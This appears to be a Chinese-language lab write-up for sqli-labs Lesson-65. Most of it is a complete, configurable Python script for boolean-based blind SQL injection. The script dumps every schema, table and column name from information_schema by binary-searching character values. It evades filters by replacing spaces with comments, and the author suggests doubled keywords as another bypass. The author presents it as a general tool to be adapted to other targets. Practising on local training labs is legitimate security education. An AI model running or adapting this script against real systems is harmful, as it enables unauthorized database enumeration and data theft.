# Lesson-65
```
Bool盲注
```

---
> 简单写了一下
> 基本上是一个通用的Bool盲注脚本 , 可以自行修改
> 目前默认是Dump所有表结构(库名 , 表名 , 列名)

---
运行截图 : 

![2016-12-17_190211.png](http://upload-images.jianshu.io/upload_images/2355077-75b5a7a456c7f25f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

![2016-12-17_190726.png](http://upload-images.jianshu.io/upload_images/2355077-2155d01c179e33f4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

---
```
#!/usr/bin/env python
# encoding:utf8

import requests
import time
import sys
import random

# hack-config-start
payload = "0|()" # 样例 : 0"or()or"="1 或	0' or()or '='1
success_symbol = "Your Username is :"
url = "http://127.0.0.1/Less-39/?id="
# 如果对参数进行了过滤 , 需要配置temper函数 , 双写或者加注释绕过
# hack-config-end

# config-start
sleep_time = 5
error_time = 1
# config-end

# define-start
system_schema_names = ['information_schema','test','mysql','performance_schema']
# define-end

# TODO-start
# 优化显示
# TODO-end

def temper(temppayload):
	temppayload = temppayload.replace(" ","/**/")
	# temppayload = temppayload.replace("or","oorr")
	# temppayload = temppayload.replace("and","anandd")
	return temppayload

def getRandomType(keywords):
	# TODO 返回随机大小写
	return ""

def getPayload(database_name, table_name, column_name, where, indexOfResult, indexOfChar, mid):
	global payload
	# http://127.0.0.1/Less-65/index.php?id=0"or()or"="1
	startStr = payload.split("()")[0]
	endStr = payload.split("()")[1]
	# ((asCIi(sUBString((sELEct/**/scheMA_Name/**/FRom/**/inforMATion_scheMa.schemaTa/**//**/liMit/**/0,1),1,1)))>0)
	temppayload = "((asCIi(sUBString((sELEct " + column_name + " FRom " + database_name + "." + table_name + " " + where + " liMit " + indexOfResult + ",1)," + indexOfChar + ",1)))>" + mid + ")"
	temppayload = startStr + temppayload + endStr
	# temper
	temppayload = temper(temppayload)
	return temppayload

def exce(database_name, table_name, column_name, where, indexOfResult, indexOfChar, mid):
	global success_symbol
	global url
	# content-start
	tempurl = url + getPayload(database_name, table_name, column_name, where, indexOfResult, indexOfChar, mid)
	# print tempurl
	content = requests.get(tempurl).text
	# print content
	# content-end
	# judge-start
	if success_symbol in content:
		return True
	else:
		return False
	# judge-end

def doubleSearch(database_name, table_name, column_name, where, indexOfResult,indexOfChar,left_number, right_number):
	while left_number < right_number:
		mid = int((left_number + right_number) / 2)
		if exce(database_name, table_name, column_name, where, str(indexOfResult),str(indexOfChar + 1),str(mid)):
			left_number = mid
		else:
			right_number = mid
		if left_number == right_number - 1:
			if exce(database_name, table_name, column_name, where, str(indexOfResult),str(indexOfChar + 1),str(mid)):
				mid += 1
				break
			else:
				break
	return chr(mid)

def getAllData(database_name, table_name, column_name, where):
	allData = []
	for i in range(32): # 需要遍历的查询结果的数量
		counter = 0
		data = ""
		for j in range(32): # 结果的长度
			counter += 1
			temp = doubleSearch(database_name, table_name, column_name, where, i, j, 0, 128) # 从255开始查询
			if ord(temp) == 1: # 当为1的时候说明已经查询结束
			    break
			sys.stdout.write(temp)
			sys.stdout.flush()
			data += temp
		if counter == 1: # 当结果集的所有行都被遍历后退出
			break
		sys.stdout.write("\r\n")
		sys.stdout.flush()
		allData.append(data)
	return allData

def getAllSchemaNames():
	return getAllData(column_name="scheMA_Name", table_name="schemaTa", database_name="inforMATion_scheMa", where="")

def getAllTableNames(schema_name):
	return getAllData(column_name="taBLE_NAmE", table_name="TabLes", database_name="inforMATion_scheMa",  where="where(table_SCHEmA='" + schema_name + "')")

def getAllColumnNames(schema_name, table_name):
	return getAllData(column_name="coLUmn_NAMe", table_name="cOLUmns", database_name="inforMATion_scheMa",  where="where(tABle_NaME='" + table_name + "' and tABLe_sCHEma='" + schema_name + "')")


def hack():
	print "================================"
	print "正在获取所有数据库 ..."
	allSchemaNames = getAllSchemaNames()
	print "所有数据库名获取完毕 !"
	print "================================"
	print "正在获取所有数据库表名 ..."
	tempDic = {}
	allUserSchemaNames = []
	for schema_name in allSchemaNames:
		print "--------------------------------"
		print "当前数据库 : " + schema_name + "\t",
		IS_SYSTEM_SCHEMA = False
		for system_schema_name in system_schema_names:
			if system_schema_name == schema_name:
				print "Mysql自带系统数据库 , 智能忽略 !"
				IS_SYSTEM_SCHEMA = True
				break
		if not IS_SYSTEM_SCHEMA:
			print ""
			allUserSchemaNames.append(schema_name)
			tempDic[schema_name] = getAllTableNames(schema_name)
	print "所有表名获取完毕!"
	print "================================"
	print "正在获取所有表列名 ..."
	for schema_name in allUserSchemaNames:
		print "--------------------------------"
		for table_name in tempDic[schema_name]:
			print "当前数据库 : " + schema_name + "\t当前表名 : " + table_name
			getAllColumnNames(schema_name, table_name)
	print "所有列名获取完毕!"
	print "================================"

hack()
```
